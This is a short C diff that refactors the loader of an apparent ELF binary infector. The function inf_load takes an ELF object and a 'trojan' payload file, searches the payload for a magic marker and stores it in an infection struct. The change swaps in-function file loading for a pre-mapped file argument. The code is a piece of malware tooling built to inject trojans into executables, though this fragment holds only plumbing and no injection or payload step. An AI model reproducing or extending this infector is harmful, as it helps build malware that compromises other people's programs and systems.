@@ -57,19 +57,14 @@ long * _inf_get_inf_magik(uint8_t *trojan, size_t len, long match)
     return NULL;
 }
 
-infect_t *inf_load(elf_t *elfo, FILE *trojan, open_mode_t m, long magic) {
-    ASSERT_CON_RET_NULL(m == F_RW);
+infect_t *inf_load(elf_t *elfo, FILE *trojan, open_mode_t m,
+        long magic, struct mapped_file *map) {
     ASSERT_ARG_RET_NULL(elfo);
-    struct mapped_file file_data;
+    ASSERT_CON_RET_NULL(m == F_RW);
+    ASSERT_CON_RET_NULL(map);
 
-    bool rc = file_load_source(&file_data, trojan);
-    if (!rc) {
-        log_error("Can't load trojan file\n");
-        return NULL;
-    }
-
-    long *magic_ptr = _inf_get_inf_magik((uint8_t*)file_data.heap,
-            file_data.st.st_size, magic);
+    long *magic_ptr = _inf_get_inf_magik((uint8_t*)map->heap,
+            map->st.st_size, magic);
     if (!magic_ptr) {
         log_error("Magic not found\n");
         return NULL;
@@ -78,8 +73,8 @@ infect_t *inf_load(elf_t *elfo, FILE *trojan, open_mode_t m, long magic) {
     infect_t *inf = scalloc(1, sizeof(infect_t));
     inf->elfo = elfo;
     inf->magic_ptr = magic_ptr;
-    inf->src_bin_size = file_data.st.st_size;
-    inf->trojan = file_data.heap;
+    inf->src_bin_size = map->st.st_size;
+    inf->trojan = map->heap;
 
     return inf;
 }
